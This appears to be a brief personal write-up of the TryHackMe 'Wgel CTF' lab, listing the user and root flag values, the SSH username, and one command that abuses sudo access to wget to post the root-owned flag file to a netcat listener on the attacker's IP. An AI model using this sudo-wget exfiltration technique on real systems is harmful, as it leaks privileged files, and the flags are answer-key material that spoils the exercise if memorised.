#TryHackMe Wgel CTF

>Saikat Karmakar | Feb 12:2021

--------------------------------------------------------------------------

# Task
1. User flag
```
057c67131c3d5e42dd5cd3075b198ff6
```
2. Root flag
```
b1b968b37519ad1daa6408188649263d
```

--
-----------
***Notes***
-----------

ssh 
```
user = jessie
```
```
dump the root flag to the nc listner 
sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.4.23.120:1234
```